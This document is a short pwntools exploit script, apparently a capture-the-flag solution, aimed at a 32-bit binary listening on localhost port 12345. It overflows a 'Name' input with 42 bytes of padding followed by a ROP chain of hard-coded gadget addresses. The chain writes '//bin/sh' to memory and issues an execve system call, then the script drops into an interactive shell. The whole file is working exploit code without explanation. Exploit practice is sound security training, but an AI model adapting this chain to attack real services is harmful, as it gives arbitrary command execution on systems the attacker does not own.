from pwn import *

context.terminal = ['urxvtc', '-e', 'sh', '-c']

rop = 'a' * 42

lea_eax_edx = 0x08067e64    # lea eax, dword ptr [edx]; ret;
pop_ecx_ebx = 0x0806ff71    # pop ecx; pop ebx; ret
pop_edx = 0x0806ff4a        # pop edx; ret;
write_addr = 0x080ec000     # writable address
mov_edx_eax = 0x0805594b    # mov dword ptr [edx], eax; ret;
xor_eax = 0x08049693        # xor eax, eax; ret;
inc_eax = 0x0807b52f        # inc eax; ret;
int80 = 0x08070510          # int 0x80; ret;

# mov //bin to writable address
rop += p32(pop_edx)
rop += '//bi'
rop += p32(lea_eax_edx)
rop += p32(pop_edx)
rop += p32(write_addr)
rop += p32(mov_edx_eax)

# append n/sh
rop += p32(pop_edx)
rop += 'n/sh'
rop += p32(lea_eax_edx)
rop += p32(pop_edx)
rop += p32(write_addr + 4)
rop += p32(mov_edx_eax)

# point ecx to null & ebx to //bin/sh
rop += p32(pop_ecx_ebx)
rop += p32(write_addr + 8)
rop += p32(write_addr)

# point edx to null
rop += p32(pop_edx)
rop += p32(write_addr + 8)

# make eax = 11 (execve)
rop += p32(xor_eax)
rop += p32(inc_eax) * 11

# make system call
rop += p32(int80)

# create remote connection
r = remote('127.0.0.1', 12345)


# interact with binary
r.recvuntil("Exit\n: ")
r.sendline("1")
r.recvuntil("Name: ")
r.sendline(rop)
r.recvuntil("Exit\n: ")
r.sendline("3")
#r.recvuntil("Bye !")

# shell time baby!
r.interactive()